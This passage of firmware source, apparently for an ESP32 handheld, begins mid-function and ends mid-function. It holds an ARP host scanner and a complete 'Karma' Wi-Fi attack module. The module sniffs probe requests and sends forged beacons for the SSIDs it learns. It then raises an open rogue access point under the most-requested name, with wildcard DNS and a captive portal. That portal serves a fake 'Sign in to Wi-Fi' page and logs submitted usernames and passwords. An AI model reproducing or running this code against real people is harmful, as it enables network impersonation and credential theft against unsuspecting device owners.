    tft.setCursor(10, 80);
    tft.print(prog);
  };
  paintHostProgress();

  struct netif* nif = staNetif();
  if (!nif) {
    s_scanning = false;
    displayBusy("ARP failed.", "No network interface.");
    delay(700);
    drawScreen(true);
    return;
  }

  const uint32_t localIp = (uint32_t)WiFi.localIP();
  const uint32_t mask = (uint32_t)WiFi.subnetMask();
  const uint32_t network = localIp & mask;
  const uint32_t broadcast = network | (~mask);

  uint32_t startHost = network + 1;
  uint32_t endHost = (broadcast > startHost) ? (broadcast - 1) : startHost;
  if (endHost < startHost) {
    endHost = startHost;
  }

  // Cap sweep size for UI responsiveness on large subnets.
  uint32_t total = endHost - startHost + 1;
  if (total > (uint32_t)ARP_MAX_HOSTS_SWEEP) {
    const uint32_t base = localIp & 0xFFFFFF00u;
    startHost = base + 1;
    endHost = base + 254;
    if (startHost < network + 1) startHost = network + 1;
    if (endHost > broadcast - 1) endHost = broadcast - 1;
  }

  // Always include gateway if present.
  const uint32_t gw = (uint32_t)WiFi.gatewayIP();
  if (gw != 0 && gw != localIp) {
    ip4_addr_t target;
    target.addr = gw;
    etharp_request(nif, &target);
    delay(ARP_BATCH_WAIT_MS);
    struct eth_addr* eth = nullptr;
    const ip4_addr_t* tip = nullptr;
    if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
      tryStoreHost(gw, eth->addr);
      paintHostProgress();
    }
  }

  uint32_t batchIps[ARP_BATCH];
  int batchCount = 0;
  uint8_t statusTick = 0;

  for (uint32_t host = startHost; host <= endHost; host++) {
    if (feature_exit_requested) {
      break;
    }
    if (host == localIp || host == broadcast || host == network) {
      continue;
    }
    batchIps[batchCount++] = host;
    if (batchCount >= ARP_BATCH) {
      for (int i = 0; i < batchCount; i++) {
        ip4_addr_t target;
        target.addr = batchIps[i];
        etharp_request(nif, &target);
      }
      delay(ARP_BATCH_WAIT_MS);
      for (int i = 0; i < batchCount; i++) {
        ip4_addr_t target;
        target.addr = batchIps[i];
        struct eth_addr* eth = nullptr;
        const ip4_addr_t* tip = nullptr;
        if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
          tryStoreHost(batchIps[i], eth->addr);
        }
      }
      batchCount = 0;
      paintHostProgress();
      if ((++statusTick & 0x07) == 0) {
        updateStatusBar();
      }
    }
  }

  if (batchCount > 0) {
    for (int i = 0; i < batchCount; i++) {
      ip4_addr_t target;
      target.addr = batchIps[i];
      etharp_request(nif, &target);
    }
    delay(ARP_BATCH_WAIT_MS);
    for (int i = 0; i < batchCount; i++) {
      ip4_addr_t target;
      target.addr = batchIps[i];
      struct eth_addr* eth = nullptr;
      const ip4_addr_t* tip = nullptr;
      if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
        tryStoreHost(batchIps[i], eth->addr);
      }
    }
    paintHostProgress();
  }

  // Also record ourselves.
  {
    uint8_t mac[6];
    WiFi.macAddress(mac);
    tryStoreHost(localIp, mac);
  }

  if (s_hostCount > 1) {
    qsort(s_hosts, s_hostCount, sizeof(HostEntry), compareHostIp);
  }

  s_scanning = false;
  s_lastRenderedPage = -1;
  drawScreen(true);
}

static void joinSelectedAp() {
  if (s_phase != Phase::ApList || s_apCount <= 0) {
    return;
  }
  if (s_currentIndex < 0 || s_currentIndex >= s_apCount) {
    return;
  }

  const ApEntry& ap = s_aps[s_currentIndex];
  String password;

  if (ap.authmode != WIFI_AUTH_OPEN) {
    if (!promptPassword(password)) {
      drawScreen(true);
      return;
    }
  }

  if (!connectToAp(ap, password.c_str())) {
    displayBusy("Join failed.", "Check password / signal.");
    delay(900);
    s_phase = Phase::ApList;
    drawScreen(true);
    return;
  }

  runArpSweep();
}

static void handleNavButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    (void)isButtonPressedEdge(BTN_SELECT);
    return;
  }

  if (s_scanning) {
    return;
  }

  const int count = (s_phase == Phase::ApList) ? s_apCount : s_hostCount;

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (s_phase == Phase::ApList) {
      feature_exit_requested = true;
    } else {
      disconnectSta();
      s_phase = Phase::ApList;
      s_hostCount = 0;
      s_currentIndex = 0;
      s_currentPage = 0;
      s_lastRenderedPage = -1;
      drawScreen(true);
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (s_phase == Phase::ApList) {
      scanAccessPoints();
    } else {
      runArpSweep();
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_phase == Phase::ApList) {
      joinSelectedAp();
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    if (count > 0) {
      s_currentIndex = (s_currentIndex + 1) % count;
      drawScreen(false);
    }
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    if (count > 0) {
      s_currentIndex = (s_currentIndex - 1 + count) % count;
      drawScreen(false);
    }
    s_lastBtnMs = now;
    return;
  }
}

static void handleTouch() {
  int x, y;
  if (!feature_active || !readTouchXY(x, y)) {
    return;
  }
  if (s_scanning) {
    return;
  }

  const int count = (s_phase == Phase::ApList) ? s_apCount : s_hostCount;
  const int perPage = networksPerPage();
  if (y >= LIST_FIRST_ROW_Y && y < wifiListBottomY() && count > 0) {
    const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
    const int idx = s_currentPage * perPage + row;
    if (row >= 0 && row < perPage && idx < count) {
      s_currentIndex = idx;
      drawScreen(false);
      delay(120);
      if (s_phase == Phase::ApList) {
        joinSelectedAp();
      }
    }
  }
}

static void runUI() {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_undo,
      bitmap_icon_go_back};

  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;
    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        if (s_phase == Phase::ApList) {
          scanAccessPoints();
        } else {
          runArpSweep();
        }
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void teardown() {
  disconnectSta();
  WiFi.scanDelete();
  s_scanning = false;
}

void arpScannerSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  s_uiDrawn = false;
  s_phase = Phase::ApList;
  s_apCount = 0;
  s_hostCount = 0;
  s_currentIndex = 0;
  s_currentPage = 0;
  s_scanning = false;
  s_lastRenderedIndex = -1;
  s_lastRenderedPage = -1;
  s_joinedSsid[0] = '\0';

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  scanAccessPoints();
}

void arpScannerLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }

  handleNavButtons();
  handleTouch();
  updateStatusBar();
  runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    teardown();
  }
}

}  // namespace ArpScanner


namespace KarmaAttack {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2
#define LINE_HEIGHT 12

static constexpr int TERM_CAPACITY = 24;
static constexpr int CARDS_Y = 42;
static constexpr int CARD_H = 34;
static constexpr int CARD_W = 70;
static constexpr int CARD_GAP = 7;
static constexpr int CARD_MARGIN = 8;
static constexpr int INFO_ROW_H = 16;
static constexpr int AP_Y = 82;
static constexpr int TOP_Y = 98;
static constexpr int BAR_ZONE_W = 30;
static constexpr int ACT_LABEL_Y = 118;
static constexpr int TERM_TOP_Y = 134;
static constexpr int MAX_PROBE_SSIDS = 32;
static constexpr unsigned long HOP_MS = 800;
static constexpr unsigned long AP_SWITCH_MS = 2500;
static constexpr unsigned long BEACON_GAP_MS = 15;
static constexpr unsigned long BTN_DEBOUNCE_MS = 200;
static constexpr unsigned long STATS_MS = 1000;
static constexpr uint16_t DNS_PORT = 53;
static constexpr const char* kTestSsids[] = {"TestKarma", "FreeWiFi", "HomeWiFi", "ESP32-DIV"};
static constexpr int kTestSsidCount = 4;

struct ProbeSsid {
  char ssid[33];
  uint16_t hits;
  int8_t rssi;
  uint8_t channel;
  uint32_t lastSeenMs;
};

static ProbeSsid s_list[MAX_PROBE_SSIDS];
static int s_count = 0;

static bool s_running = false;
static bool s_uiDrawn = false;
static bool s_headerDirty = true;
static bool s_portalUp = false;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastHopMs = 0;
static unsigned long s_lastApSwitchMs = 0;
static unsigned long s_lastBeaconMs = 0;
static unsigned long s_lastStatsMs = 0;
static uint8_t s_channel = 6;
static uint8_t s_beaconIdx = 0;
static int s_activeApIndex = -1;
static uint32_t s_probeFrames = 0;
static uint32_t s_namedProbes = 0;
static uint32_t s_beaconsSent = 0;
static uint32_t s_beaconRate = 0;
static uint32_t s_beaconsAtMark = 0;
static unsigned long s_rateMarkMs = 0;
static uint8_t s_lastClients = 0;

static char s_apSsid[33] = "";
static char s_lastUser[32] = "";
static char s_lastPass[32] = "";
static uint16_t s_credCount = 0;

static String s_term[TERM_CAPACITY];
static uint16_t s_termColor[TERM_CAPACITY];
static int s_termLines = 0;

static DNSServer s_dns;
static WebServer s_server(80);
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool s_logPending = false;
static char s_pendingLog[48];
static uint16_t s_pendingLogColor = UI_TEXT;

static uint8_t s_beaconFrame[128];
static uint8_t s_srcMac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};

static char s_hdrCacheAp[52] = "";
static char s_hdrCacheTop[52] = "";
static char s_cardCache[3][10] = {"", "", ""};
static uint16_t s_cardColor[3] = {0, 0, 0};
static int s_barsCache = -2;
static bool s_navDrawnRunning = false;
static bool s_navDrawn = false;
static bool s_chromeDrawn = false;

static void runUI();
static void drawDashboard(bool full);
static void updateHeader(bool force = false);
static void updateNavLabels(bool force = false);
static void logLine(const String& text, uint16_t color);
static void flushPendingLog();
static void startKarma();
static void stopKarma();
static void clearLearned();
static void promptAddSsid();
static void ensurePortal();
static void stopPortal();
static void maybeSwitchAp();
static void sendNextBeacon();
static void hopIfNeeded();
static void paintTextLine(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color);
static void invalidateHeaderCache();
static void tickBeaconRate();
static void truncSsid(char* out, size_t n, const char* ssid, size_t maxChars);
static bool bestSsidSnapshot(ProbeSsid& out);
static int cardX(int i);
static void drawStatCardsChrome();
static void paintStatCardValue(int i, const char* value, uint16_t color);
static int rssiBars(int8_t rssi);
static void drawSignalBars(int x, int baseY, int bars);
static bool paintTextLineEx(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color);
static bool paintInfoRow(int y, char* cache, size_t cacheSz, const char* text, uint16_t color,
                         int textMaxW);

static int termVisibleLines() {
  return min(TERM_CAPACITY, wifiMaxLinesInZone(TERM_TOP_Y, LINE_HEIGHT));
}

static void invalidateHeaderCache() {
  s_hdrCacheAp[0] = '\0';
  s_hdrCacheTop[0] = '\0';
  s_cardCache[0][0] = '\0';
  s_cardCache[1][0] = '\0';
  s_cardCache[2][0] = '\0';
  s_cardColor[0] = 0;
  s_cardColor[1] = 0;
  s_cardColor[2] = 0;
  s_barsCache = -2;
}

static int cardX(int i) {
  return CARD_MARGIN + i * (CARD_W + CARD_GAP);
}

static void drawStatCardsChrome() {
  static const char* kLabels[3] = {"SSIDS", "TX/S", "CLIENTS"};
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(1);
  for (int i = 0; i < 3; i++) {
    const int x = cardX(i);
    tft.fillRoundRect(x, CARDS_Y, CARD_W, CARD_H, 4, UI_FG);
    tft.drawRoundRect(x, CARDS_Y, CARD_W, CARD_H, 4, UI_LINE);
    tft.setTextColor(UI_DIM_TEXT, UI_FG);
    tft.drawString(kLabels[i], x + CARD_W / 2, CARDS_Y + 8);
  }
  tft.setTextDatum(TL_DATUM);
}

static void paintStatCardValue(int i, const char* value, uint16_t color) {
  if (i < 0 || i > 2 || !value) {
    return;
  }
  if (strcmp(s_cardCache[i], value) == 0 && s_cardColor[i] == color) {
    return;
  }
  const int x = cardX(i);
  tft.fillRect(x + 2, CARDS_Y + 16, CARD_W - 4, CARD_H - 18, UI_FG);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(color, UI_FG);
  tft.drawString(value, x + CARD_W / 2, CARDS_Y + 24);
  tft.setTextDatum(TL_DATUM);
  tft.setTextFont(1);
  strncpy(s_cardCache[i], value, sizeof(s_cardCache[i]) - 1);
  s_cardCache[i][sizeof(s_cardCache[i]) - 1] = '\0';
  s_cardColor[i] = color;
}

static int rssiBars(int8_t rssi) {
  if (rssi >= -55) return 4;
  if (rssi >= -67) return 3;
  if (rssi >= -78) return 2;
  if (rssi >= -88) return 1;
  return 0;
}

static void drawSignalBars(int x, int baseY, int bars) {
  for (int i = 0; i < 4; i++) {
    const int h = 3 + i * 2;
    const int bx = x + i * 5;
    const int by = baseY - h;
    const uint16_t c = (i < bars) ? ORANGE : UI_LINE;
    tft.fillRect(bx, by, 3, h, c);
  }
}

static void truncSsid(char* out, size_t n, const char* ssid, size_t maxChars) {
  if (!out || n == 0) {
    return;
  }
  if (!ssid) {
    out[0] = '\0';
    return;
  }
  const size_t len = strlen(ssid);
  if (len <= maxChars || maxChars < 2 || n < 2) {
    strncpy(out, ssid, n - 1);
    out[n - 1] = '\0';
    return;
  }
  const size_t keep = maxChars - 1;
  if (keep >= n) {
    strncpy(out, ssid, n - 1);
    out[n - 1] = '\0';
    return;
  }
  memcpy(out, ssid, keep);
  out[keep] = '~';
  out[keep + 1] = '\0';
}

static void tickBeaconRate() {
  const unsigned long now = millis();
  if (s_rateMarkMs == 0) {
    s_rateMarkMs = now;
    s_beaconsAtMark = s_beaconsSent;
    s_beaconRate = 0;
    return;
  }
  if (now - s_rateMarkMs < 1000) {
    return;
  }
  s_beaconRate = s_beaconsSent - s_beaconsAtMark;
  s_beaconsAtMark = s_beaconsSent;
  s_rateMarkMs = now;
}

static bool bestSsidSnapshot(ProbeSsid& out) {
  bool ok = false;
  portENTER_CRITICAL(&s_mux);
  if (s_count > 0) {
    int best = 0;
    for (int i = 1; i < s_count; i++) {
      if (s_list[i].hits > s_list[best].hits) {
        best = i;
      } else if (s_list[i].hits == s_list[best].hits &&
                 s_list[i].lastSeenMs > s_list[best].lastSeenMs) {
        best = i;
      }
    }
    out = s_list[best];
    ok = true;
  }
  portEXIT_CRITICAL(&s_mux);
  return ok;
}

static bool paintTextLineEx(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return false;
  }

  tft.setTextFont(1);
  tft.setTextSize(1);
  const int oldW = (cache && cache[0]) ? tft.textWidth(cache) : 0;
  const int newW = text[0] ? tft.textWidth(text) : 0;
  int clearW = oldW > newW ? oldW : newW;
  clearW += 4;
  if (clearW > w) {
    clearW = w;
  }
  if (clearW < 1) {
    clearW = 1;
  }

  tft.fillRect(x, y, clearW, LINE_HEIGHT, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
  return true;
}

// Full-width row clear so AP / Top never ghost or overlay each other.
static bool paintInfoRow(int y, char* cache, size_t cacheSz, const char* text, uint16_t color,
                         int textMaxW) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return false;
  }

  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.fillRect(0, y, SCREEN_WIDTH, INFO_ROW_H, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(CARD_MARGIN, y + 3);
  tft.print(text);
  (void)textMaxW;
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
  return true;
}

static void paintTextLine(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color) {
  (void)paintTextLineEx(y, x, w, cache, cacheSz, text, color);
}

static void updateNavLabels(bool force) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (!force && s_navDrawn && s_navDrawnRunning == s_running) {
    return;
  }
  s_navDrawnRunning = s_running;
  s_navDrawn = true;
  setTouchNavLabels("Back", "Clear", s_running ? "Stop" : "Start", nullptr, "Add");
  redrawTouchButtonBar();
}

static bool parseSsidIe(const uint8_t* ie, int ieLen, char* out, size_t outSz) {
  if (!ie || ieLen < 2 || !out || outSz < 2) {
    return false;
  }
  int off = 0;
  while (off + 2 <= ieLen) {
    const uint8_t id = ie[off];
    const uint8_t len = ie[off + 1];
    if (off + 2 + len > ieLen) {
      break;
    }
    if (id == 0) {
      if (len == 0 || len > 32) {
        return false;
      }
      bool allZero = true;
      for (uint8_t i = 0; i < len; i++) {
        if (ie[off + 2 + i] != 0) {
          allZero = false;
          break;
        }
      }
      if (allZero) {
        return false;
      }
      const size_t n = min((size_t)len, outSz - 1);
      memcpy(out, &ie[off + 2], n);
      out[n] = '\0';
      return true;
    }
    off += 2 + len;
  }
  return false;
}

static void queueLogFromIsr(const char* text, uint16_t color) {
  strncpy(s_pendingLog, text, sizeof(s_pendingLog) - 1);
  s_pendingLog[sizeof(s_pendingLog) - 1] = '\0';
  s_pendingLogColor = color;
  s_logPending = true;
}

static int findSsidIndex(const char* ssid) {
  for (int i = 0; i < s_count; i++) {
    if (strcmp(s_list[i].ssid, ssid) == 0) {
      return i;
    }
  }
  return -1;
}

static int hottestIndex() {
  if (s_count <= 0) {
    return -1;
  }
  int best = 0;
  for (int i = 1; i < s_count; i++) {
    if (s_list[i].hits > s_list[best].hits) {
      best = i;
    } else if (s_list[i].hits == s_list[best].hits &&
               s_list[i].lastSeenMs > s_list[best].lastSeenMs) {
      best = i;
    }
  }
  return best;
}

static void recordProbeSsid(const char* ssid, int8_t rssi, uint8_t channel) {
  if (!ssid || !ssid[0]) {
    return;
  }

  bool isNew = false;
  portENTER_CRITICAL(&s_mux);
  int found = findSsidIndex(ssid);
  if (found >= 0) {
    if (s_list[found].hits < 0xFFFF) {
      s_list[found].hits++;
    }
    s_list[found].rssi = rssi;
    s_list[found].lastSeenMs = millis();
    if (channel >= 1 && channel <= 14) {
      s_list[found].channel = channel;
    }
  } else if (s_count < MAX_PROBE_SSIDS) {
    ProbeSsid& e = s_list[s_count];
    strncpy(e.ssid, ssid, sizeof(e.ssid) - 1);
    e.ssid[sizeof(e.ssid) - 1] = '\0';
    e.hits = 1;
    e.rssi = rssi;
    e.channel = (channel >= 1 && channel <= 14) ? channel : s_channel;
    e.lastSeenMs = millis();
    s_count++;
    isNew = true;
  }
  portEXIT_CRITICAL(&s_mux);

  if (isNew) {
    char buf[48];
    snprintf(buf, sizeof(buf), "[+] learn %s", ssid);
    queueLogFromIsr(buf, GREEN);
    s_headerDirty = true;
  }
}

static void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!feature_active || !s_running) {
    return;
  }
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_MISC) {
    return;
  }

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (!pkt || !pkt->payload) {
    return;
  }

  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) {
    return;
  }
  if ((p[0] & 0xFC) != 0x40) {
    return;
  }

  s_probeFrames++;

  char ssid[33];
  bool ok = parseSsidIe(p + 24, len - 24, ssid, sizeof(ssid));
  if (!ok && len > 28) {
    ok = parseSsidIe(p + 24, len - 28, ssid, sizeof(ssid));
  }
  if (!ok) {
    return;
  }
  for (const char* c = ssid; *c; ++c) {
    if ((uint8_t)*c < 0x20 || (uint8_t)*c > 0x7E) {
      return;
    }
  }

  s_namedProbes++;
  uint8_t ch = pkt->rx_ctrl.channel;
  if (ch < 1 || ch > 14) {
    ch = s_channel;
  }
  recordProbeSsid(ssid, pkt->rx_ctrl.rssi, ch);
}

static uint16_t buildBeacon(const char* ssid, uint8_t channel, uint8_t* out, uint16_t outMax) {
  if (!ssid || !out || outMax < 64) {
    return 0;
  }
  const uint8_t ssidLen = (uint8_t)min((size_t)32, strlen(ssid));
  // 24 hdr + 12 fixed + 2+ssid + 10 rates + 3 ds
  const uint16_t need = (uint16_t)(24 + 12 + 2 + ssidLen + 10 + 3);
  if (need > outMax) {
    return 0;
  }

  uint16_t pos = 0;
  out[pos++] = 0x80;  // Beacon
  out[pos++] = 0x00;
  out[pos++] = 0x00;
  out[pos++] = 0x00;
  memset(&out[pos], 0xFF, 6);  // DA broadcast
  pos += 6;
  memcpy(&out[pos], s_srcMac, 6);  // SA
  pos += 6;
  memcpy(&out[pos], s_srcMac, 6);  // BSSID
  pos += 6;
  out[pos++] = 0x00;
  out[pos++] = 0x00;  // seq

  memset(&out[pos], 0, 8);  // timestamp
  pos += 8;
  out[pos++] = 0x64;
  out[pos++] = 0x00;  // beacon interval
  out[pos++] = 0x01;
  out[pos++] = 0x04;  // caps: ESS + privacy off / short preamble-ish

  out[pos++] = 0x00;
  out[pos++] = ssidLen;
  memcpy(&out[pos], ssid, ssidLen);
  pos += ssidLen;

  static const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(&out[pos], rates, sizeof(rates));
  pos += sizeof(rates);

  out[pos++] = 0x03;
  out[pos++] = 0x01;
  out[pos++] = channel;
  return pos;
}

static void sendNextBeacon() {
  if (!s_running || s_count <= 0) {
    return;
  }
  if (millis() - s_lastBeaconMs < BEACON_GAP_MS) {
    return;
  }
  s_lastBeaconMs = millis();

  if (s_beaconIdx >= s_count) {
    s_beaconIdx = 0;
  }

  ProbeSsid entry;
  portENTER_CRITICAL(&s_mux);
  entry = s_list[s_beaconIdx];
  const int n = s_count;
  portEXIT_CRITICAL(&s_mux);

  s_beaconIdx = (uint8_t)((s_beaconIdx + 1) % max(1, n));

  // Randomize locally-administered MAC each burst for variety.
  s_srcMac[1] = random(256);
  s_srcMac[2] = random(256);
  s_srcMac[3] = random(256);
  s_srcMac[4] = random(256);
  s_srcMac[5] = random(256);
  s_srcMac[0] = 0x02;

  const uint16_t len = buildBeacon(entry.ssid, s_channel, s_beaconFrame, sizeof(s_beaconFrame));
  if (len == 0) {
    return;
  }
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  if (esp_wifi_80211_tx(WIFI_IF_AP, s_beaconFrame, len, false) == ESP_OK) {
    s_beaconsSent++;
  }
}

static void stopPortal() {
  s_server.stop();
  s_dns.stop();
  s_portalUp = false;
}

static void karmaRedirectLogin() {
  s_server.sendHeader("Location", "/login.html", true);
  s_server.send(302, "text/plain", "");
}

static void karmaHandleLoginPost() {
  String user = s_server.hasArg("username") ? s_server.arg("username") : "";
  String pass = s_server.hasArg("password") ? s_server.arg("password") : "";
  user.trim();
  pass.trim();
  if (user.length() > 0 || pass.length() > 0) {
    strncpy(s_lastUser, user.c_str(), sizeof(s_lastUser) - 1);
    s_lastUser[sizeof(s_lastUser) - 1] = '\0';
    strncpy(s_lastPass, pass.c_str(), sizeof(s_lastPass) - 1);
    s_lastPass[sizeof(s_lastPass) - 1] = '\0';
    s_credCount++;
    char buf[48];
    snprintf(buf, sizeof(buf), "[!] cred %s / %s", s_lastUser, s_lastPass);
    logLine(buf, ORANGE);
  }
  s_server.send(200, "text/html",
                "<html><body style='font-family:sans-serif;text-align:center;padding:40px'>"
                "<h3>Connecting...</h3></body></html>");
}

static const char* kLoginHtml =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Wi-Fi Login</title><style>"
    "body{font-family:Arial,sans-serif;text-align:center;padding:24px;background:#f2f2f2}"
    ".box{max-width:360px;margin:auto;padding:20px;background:#fff;border-radius:10px}"
    "input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}"
    "button{width:100%;padding:12px;background:#007BFF;color:#fff;border:0;border-radius:6px}"
    "</style></head><body><div class='box'><h2>Sign in to Wi-Fi</h2>"
    "<form method='POST' action='/login'>"
    "<input name='username' placeholder='Username' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button type='submit'>Connect</button></form></div></body></html>";

static void ensurePortal() {
  if (s_portalUp) {
    return;
  }
  s_dns.setErrorReplyCode(DNSReplyCode::NoError);
  s_dns.start(DNS_PORT, "*", WiFi.softAPIP());
  s_server.on("/generate_204", HTTP_GET, karmaRedirectLogin);
  s_server.on("/hotspot-detect.html", HTTP_GET, karmaRedirectLogin);
  s_server.on("/ncsi.txt", HTTP_GET, karmaRedirectLogin);
  s_server.on("/connecttest.txt", HTTP_GET, karmaRedirectLogin);
  s_server.on("/login.html", HTTP_GET, []() { s_server.send(200, "text/html", kLoginHtml); });
  s_server.on("/", HTTP_GET, karmaRedirectLogin);
  s_server.on("/login", HTTP_POST, karmaHandleLoginPost);
  s_server.onNotFound(karmaRedirectLogin);
  s_server.begin();
  s_portalUp = true;
  logLine("[*] Portal ready", UI_DIM_TEXT);
}

static void applySoftAp(const char* ssid, uint8_t channel) {
  if (!ssid || !ssid[0]) {
    return;
  }
  if (channel < 1 || channel > 14) {
    channel = 6;
  }
  s_channel = channel;
  strncpy(s_apSsid, ssid, sizeof(s_apSsid) - 1);
  s_apSsid[sizeof(s_apSsid) - 1] = '\0';

  WiFi.softAPdisconnect(true);
  delay(30);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(s_apSsid, nullptr, s_channel);
  delay(40);
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

  // Keep sniffing while AP is up.
  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);

  ensurePortal();
  s_headerDirty = true;

  char buf[48];
  snprintf(buf, sizeof(buf), "[*] AP -> %s", s_apSsid);
  logLine(buf, ORANGE);
}

static void maybeSwitchAp() {
  if (!s_running || s_count <= 0) {
    return;
  }
  if (millis() - s_lastApSwitchMs < AP_SWITCH_MS) {
    return;
  }

  const int best = hottestIndex();
  if (best < 0) {
    return;
  }

  ProbeSsid e;
  portENTER_CRITICAL(&s_mux);
  e = s_list[best];
  portEXIT_CRITICAL(&s_mux);

  if (best == s_activeApIndex && strcmp(s_apSsid, e.ssid) == 0) {
    s_lastApSwitchMs = millis();
    return;
  }

  s_activeApIndex = best;
  s_lastApSwitchMs = millis();
  applySoftAp(e.ssid, e.channel);
}

static void hopIfNeeded() {
  // Only hop while running with no learned SSIDs yet (learning phase).
  if (!s_running || s_count > 0) {
    return;
  }
  if (millis() - s_lastHopMs < HOP_MS) {
    return;
  }
  s_lastHopMs = millis();
  s_channel++;
  if (s_channel > 13) {
    s_channel = 1;
  }
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  // Channel is not shown in the header — avoid dirtying UI on every hop.
}

static void scrollTerm() {
  const int cap = termVisibleLines();
  for (int i = 0; i < cap - 1; i++) {
    s_term[i] = s_term[i + 1];
    s_termColor[i] = s_termColor[i + 1];
  }
}

static void paintTermLine(int index) {
  const int cap = termVisibleLines();
  if (index < 0 || index >= s_termLines || index >= cap) {
    return;
  }
  const int y = TERM_TOP_Y + index * LINE_HEIGHT;
  if (y + LINE_HEIGHT > wifiContentBottom()) {
    return;
  }
  tft.fillRect(CARD_MARGIN, y, SCREEN_WIDTH - CARD_MARGIN * 2, LINE_HEIGHT, TFT_BLACK);
